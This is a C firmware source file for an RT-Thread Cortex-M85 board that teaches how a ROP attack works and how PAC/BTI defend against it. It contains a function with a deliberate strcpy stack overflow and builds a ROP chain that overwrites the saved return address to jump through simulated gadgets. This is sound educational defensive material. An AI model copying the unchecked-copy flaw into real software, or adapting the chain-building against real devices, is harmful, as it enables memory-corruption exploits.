/*
 * Copyright (c) 2006-2025
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * Change Logs:
 * Date           Author            Notes
 * 2025-10-26     Tianchi YU        ROP attack demonstration for educational purposes
 */

#include <rtthread.h>
#include <rtdevice.h>
#include "hal_data.h"
#include <stdint.h>
#include <string.h>
#include "core_cm85.h"

#define LED_PIN BSP_IO_PORT_01_PIN_02

/* ========== ROP Gadgets (Simulated vulnerable functions) ========== */

/**
 * @brief Gadget 1: Set a global flag (simulates privileged operation)
 */
static volatile uint32_t g_privileged_flag = 0;

__attribute__((noinline))
static void gadget_set_flag(void)
{
    rt_kprintf("[GADGET] Setting privileged flag!\n");
    g_privileged_flag = 0xDEADBEEF;
    // This function ends with a return, making it a potential ROP gadget
}

/**
 * @brief Gadget 2: Print secret information
 */
__attribute__((noinline))
static void gadget_leak_secret(void)
{
    rt_kprintf("[GADGET] Secret leaked: 0x%08X\n", 0x12345678);
    // This function also ends with a return
}

/**
 * @brief Gadget 3: Execute "dangerous" operation
 */
__attribute__((noinline))
static void gadget_dangerous_op(void)
{
    rt_kprintf("[GADGET] Executing dangerous operation!\n");
    // Simulates some privileged or dangerous operation
}

/* ========== Vulnerable Function (Buffer Overflow) ========== */

/**
 * @brief Vulnerable function with stack buffer overflow
 * @param input User input string
 * 
 * This function intentionally has a buffer overflow vulnerability
 * for demonstration of ROP attacks
 */
__attribute__((noinline, optimize("O0")))
static void vulnerable_function(const char *input)
{
	  //rt_kprintf("[DEBUG]SP after PUSH: 0x%08X\n", __get_SP());

    char buffer[16];  // Small buffer - vulnerable to overflow
    
	  //rt_kprintf("[DEBUG]Buffer addr:   0x%08X\n", (uint32_t)buffer);
    //rt_kprintf("[DEBUG]LR saved at:   0x%08X\n", (uint32_t)(__get_SP() + 0x1C));
    //rt_kprintf("[DEBUG]LR value:      0x%08X\n", *(uint32_t*)(__get_SP() + 0x1C));
	
    rt_kprintf("[VULN] Entering vulnerable_function\n");
    rt_kprintf("[VULN] Buffer address: %p\n", (void*)buffer);
    rt_kprintf("[VULN] Input length: %d\n", strlen(input));
    
    // VULNERABILITY: No bounds checking!
    strcpy(buffer, input);  // Dangerous! Can overflow the buffer
    
    rt_kprintf("[VULN] Buffer content: %s\n", buffer);
    rt_kprintf("[VULN] Returning from vulnerable_function\n");
}

/* ========== Normal Function (for comparison) ========== */

__attribute__((noinline))
static void normal_function(void)
{
    rt_kprintf("[NORMAL] This is a normal function call\n");
    rt_kprintf("[NORMAL] Privileged flag value: 0x%08X\n", g_privileged_flag);
}

/* ========== Attack Demonstration Functions ========== */

/**
 * @brief Demonstrate normal execution flow (no attack)
 */
static void demo_normal_execution(void)
{
    rt_kprintf("\n=== DEMO 1: Normal Execution ===\n");
    
    const char *safe_input = "Hello";
    vulnerable_function(safe_input);
    normal_function();
    
    rt_kprintf("[RESULT] Privileged flag: 0x%08X (should be 0)\n\n", g_privileged_flag);
}

/**
 * @brief Demonstrate ROP attack without PAC protection
 * 
 * This function shows how an attacker can chain together
 * existing code snippets (gadgets) to perform unauthorized operations
 */
static void demo_rop_attack(void)
{
    rt_kprintf("\n=== DEMO 2: ROP Attack (without PAC) ===\n");
    rt_kprintf("[ATTACK] Preparing ROP chain...\n");
    
    // Print gadget addresses
    rt_kprintf("[INFO] Gadget addresses:\n");
    rt_kprintf("  - gadget_set_flag:    %p\n", (void*)gadget_set_flag);
    rt_kprintf("  - gadget_leak_secret: %p\n", (void*)gadget_leak_secret);
    rt_kprintf("  - gadget_dangerous_op: %p\n", (void*)gadget_dangerous_op);
    rt_kprintf("  - normal_function:    %p\n", (void*)normal_function);
    
    /*
     * ROP Attack Explanation:
     * 
     * 1. Attacker overflows the buffer in vulnerable_function
     * 2. The overflow overwrites the saved return address on the stack
     * 3. Instead of returning to the caller, execution jumps to gadget_set_flag
     * 4. After gadget_set_flag returns, it can chain to another gadget
     * 5. This creates a "ROP chain" executing unauthorized operations
     * 
     * Without PAC: The CPU has no way to verify if the return address
     *              has been tampered with, so the attack succeeds.
     * 
     * With PAC:    The return address would be signed (authenticated),
     *              and tampering would cause an authentication fault.
     */
    
    // Build malicious input (This is a simplified demonstration)
    // In a real attack, this would carefully craft the stack layout
    char malicious_input[64];
		int offset = 28;
    memset(malicious_input, 'A', offset);
		// copy addr of gadget_set_flag(0x020031ad) to malicious input
		
    rt_kprintf("[ATTACK] Constructed malicious input\n");
    // 构造ROP链
    uint32_t *rop_chain = (uint32_t *)(malicious_input + offset);
    
    // 第1个gadget地址 (覆盖LR) - 注意Thumb模式地址需要+1
    uint32_t gadget1_addr = (uint32_t)gadget_set_flag;
    if (!(gadget1_addr & 0x1)) {
        gadget1_addr |= 0x1;  // 确保Thumb位被设置
    }
    rop_chain[0] = gadget1_addr;  // 覆盖保存的LR
    
    // 第2个gadget地址 (当gadget1 return时会跳转到这里)
    uint32_t gadget2_addr = (uint32_t)gadget_leak_secret | 0x1;
    rop_chain[1] = gadget2_addr;
    
    // 第3个gadget地址
    uint32_t gadget3_addr = (uint32_t)gadget_dangerous_op | 0x1;
    rop_chain[2] = gadget3_addr;
    
    // 最后返回到normal_function
    uint32_t final_addr = (uint32_t)normal_function | 0x1;
    rop_chain[3] = final_addr;
    
    // 终止字符串
    malicious_input[offset + 16] = '\0';
    
    rt_kprintf("[ATTACK] Constructed ROP chain:\n");
    rt_kprintf("  Offset to LR: %d bytes\n", offset);
    rt_kprintf("  ROP[0] (覆盖LR):      0x%08X -> gadget_set_flag\n", rop_chain[0]);
    rt_kprintf("  ROP[1] (LR return):   0x%08X -> gadget_leak_secret\n", rop_chain[1]);
    rt_kprintf("  ROP[2] (继续链):      0x%08X -> gadget_dangerous_op\n", rop_chain[2]);
    rt_kprintf("  ROP[3] (最终返回):    0x%08X -> normal_function\n", rop_chain[3]);
    
    rt_kprintf("\n[WARNING] Launching ROP attack...\n");
    
    // 重置标志用于验证
    g_privileged_flag = 0;
    
    rt_kprintf("\n[SIMULATION] Executing ROP chain:\n");
    vulnerable_function(malicious_input);
		
    rt_kprintf("\n[RESULT] Attack completed!\n");
    rt_kprintf("[RESULT] Privileged flag: 0x%08X ", g_privileged_flag);
    if (g_privileged_flag == 0xDEADBEEF) {
        rt_kprintf("(COMPROMISED! ✗)\n");
    } else {
        rt_kprintf("(Protected ✓)\n");
    }
    rt_kprintf("\n");
}

/**
 * @brief Demonstrate how PAC would defend against ROP
 * 
 * Note: This requires compilation with PAC enabled
 */
static void demo_pac_defense(void)
{
    rt_kprintf("\n=== DEMO 3: PAC Defense Against ROP ===\n");
    rt_kprintf("[INFO] PAC (Pointer Authentication Code) defense:\n");
    rt_kprintf("  1. Function entry: LR is signed with PACIASP\n");
    rt_kprintf("  2. Function exit:  LR is authenticated with AUTIASP\n");
    rt_kprintf("  3. If LR was tampered: Authentication fault occurs\n");
    rt_kprintf("\n[NOTE] To test PAC defense:\n");
    rt_kprintf("  - Recompile with -mbranch-protection=pac-ret+bti\n");
    rt_kprintf("  - The same ROP attack will trigger an authentication fault\n");
    rt_kprintf("  - This prevents the attacker from hijacking control flow\n\n");
}

/* ========== Educational Summary ========== */

static void print_educational_summary(void)
{
    rt_kprintf("\n" );
    rt_kprintf("╔════════════════════════════════════════════════════════════════╗\n");
    rt_kprintf("║           ROP Attack & PAC Defense - Educational Demo         ║\n");
    rt_kprintf("╠════════════════════════════════════════════════════════════════╣\n");
    rt_kprintf("║ ROP (Return-Oriented Programming):                            ║\n");
    rt_kprintf("║  - Exploits buffer overflow to overwrite return addresses     ║\n");
    rt_kprintf("║  - Chains together existing code snippets (gadgets)           ║\n");
    rt_kprintf("║  - Bypasses DEP/NX by reusing existing executable code        ║\n");
    rt_kprintf("║                                                                ║\n");
    rt_kprintf("║ PAC (Pointer Authentication Codes):                           ║\n");
    rt_kprintf("║  - Signs return addresses with cryptographic signature        ║\n");
    rt_kprintf("║  - Verifies signature before using the return address         ║\n");
    rt_kprintf("║  - Tampered addresses cause authentication fault              ║\n");
    rt_kprintf("║  - Effectively defeats ROP attacks                            ║\n");
    rt_kprintf("║                                                                ║\n");
    rt_kprintf("║ Cortex-M85 Implementation:                                    ║\n");
    rt_kprintf("║  - PACIASP: Sign LR on function entry                         ║\n");
    rt_kprintf("║  - AUTIASP: Authenticate LR on function return                ║\n");
    rt_kprintf("║  - Enabled with: -mbranch-protection=pac-ret+bti              ║\n");
    rt_kprintf("╚════════════════════════════════════════════════════════════════╝\n");
    rt_kprintf("\n");
}

/* ========== Main Entry ========== */

void hal_entry(void)
{
    rt_kprintf("\n");
    rt_kprintf("╔════════════════════════════════════════════════════════════════╗\n");
    rt_kprintf("║     ARM Cortex-M85 ROP Attack Educational Demonstration       ║\n");
    rt_kprintf("║              PAC/BTI Security Features                         ║\n");
    rt_kprintf("╚════════════════════════════════════════════════════════════════╝\n");
    
    // Educational demonstrations
    print_educational_summary();
    
    demo_normal_execution();    // Show normal behavior
    demo_rop_attack();          // Demonstrate ROP attack
    demo_pac_defense();         // Explain PAC defense
    
    rt_kprintf("\n[INFO] Demonstration complete. LED will blink to indicate system is running.\n");
    rt_kprintf("[INFO] Reset the board to run the demo again.\n\n");
    
    // LED blinking loop
    while (1)
    {
        rt_pin_write(LED_PIN, PIN_HIGH);
        rt_thread_mdelay(500);
        rt_pin_write(LED_PIN, PIN_LOW);
        rt_thread_mdelay(500);
    }
}
